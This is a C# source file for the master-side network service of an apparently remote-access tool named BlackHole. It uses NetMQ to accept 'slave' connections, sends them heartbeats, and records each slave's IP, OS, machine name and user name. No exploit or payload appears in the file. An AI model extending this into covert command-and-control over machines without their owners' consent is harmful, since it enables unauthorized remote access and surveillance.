using BlackHole.Common;
using BlackHole.Common.Network.Protocol;
using NetMQ;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace BlackHole.Master
{
    /// <summary>
    /// 
    /// </summary>
    public sealed class NetworkService : Singleton<NetworkService>, IEventListener<SlaveEvent, Slave>
    {
        public const int PING_INTERVAL = 1000;
        public const int PING_COUNT_BEFORE_DISCONNECTION = 5;
        
        private NetMQContext m_netContext;
        private NetMQSocket m_server;
        private Poller m_poller;
        private Dictionary<int, Slave> m_slaveById;
        private bool m_started;

        /// <summary>
        /// 
        /// </summary>
        public NetworkService()
        {
            m_slaveById = new Dictionary<int, Slave>();
            Slave.SlaveEvents.Subscribe(this);
        }

        /// <summary>
        /// 
        /// </summary>
        public void Start()
        {
            m_netContext = NetMQContext.Create();
            m_server = m_netContext.CreateRouterSocket();
            m_server.Bind("tcp://*:5556");
            m_server.ReceiveReady += Server_ReceiveReady;

            var heartbeatTimer = new NetMQTimer(PING_INTERVAL);
            heartbeatTimer.Elapsed += Heartbeat;
            
            m_poller = new Poller();
            m_poller.AddSocket(m_server);
            m_poller.AddTimer(heartbeatTimer);
            m_poller.PollTillCancelledNonBlocking();
            m_started = true;
        }
        
        /// <summary>
        /// 
        /// </summary>
        public void Stop()
        {
            if (m_started)
            {
                m_poller.Dispose();
                m_server.Dispose();
                m_netContext.Dispose();
                m_started = false;
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        public bool Send(NetMQMessage message)
        {
            return m_server.TrySendMultipartMessage(message);
        }

        /// <summary>
        /// 
        /// </summary>
        private void Heartbeat(object sender, NetMQTimerEventArgs e)
        {
            foreach(var slave in m_slaveById.Values.ToArray())
            {
                slave.PingAndIncrementTimeout();
                if(slave.PingTimeout > PING_COUNT_BEFORE_DISCONNECTION)                
                    FireSlaveDisconnected(slave);                
            }
        }
        
        /// <summary>
        /// 
        /// </summary>
        /// <param name="slave"></param>
        private void FireSlaveConnected(Slave slave)
        {
            Slave.PostEvent(new SlaveEvent(SlaveEventType.CONNECTED, slave));
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="slave"></param>
        private void FireSlaveDisconnected(Slave slave)
        {
            m_slaveById.Remove(slave.Id);
            Slave.PostEvent(new SlaveEvent(SlaveEventType.DISCONNECTED, slave));
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="slave"></param>
        /// <param name="message"></param>
        private void FireSlaveIncommingMessage(Slave slave, NetMessage message)
        {
            Slave.PostEvent(new SlaveEvent(SlaveEventType.INCOMMING_MESSAGE, slave, message));
        }
        
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void Server_ReceiveReady(object sender, NetMQSocketEventArgs e)
        { 
            var frames = e.Socket.ReceiveMultipartMessage();
            var identity = frames.First.Buffer;
            var clientId = BitConverter.ToInt32(identity, 1);
            var message = NetMessage.Deserialize(frames.Last.Buffer);
            
            Slave slave = null;
            if (!m_slaveById.ContainsKey(clientId))            
                m_slaveById.Add(clientId, slave = new Slave(identity, clientId));            
            else
                slave = m_slaveById[clientId];

            FireSlaveIncommingMessage(slave, message);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="ev"></param>
        public void OnEvent(SlaveEvent ev)
        {
            switch ((SlaveEventType)ev.EventType)
            {
                case SlaveEventType.INCOMMING_MESSAGE:
                    ev.Data
                        .Match()
                        .With<GreetTheMasterMessage>(m =>
                        {
                            ev.Source.Initialize(m.Ip, m.OperatingSystem, m.MachineName, m.UserName);
                            FireSlaveConnected(ev.Source);
                        })
                        .With<PongMessage>(m =>
                        {
                            ev.Source.DecrementPingTimeout();
                        });
                    break;
            }
        }
    }
}
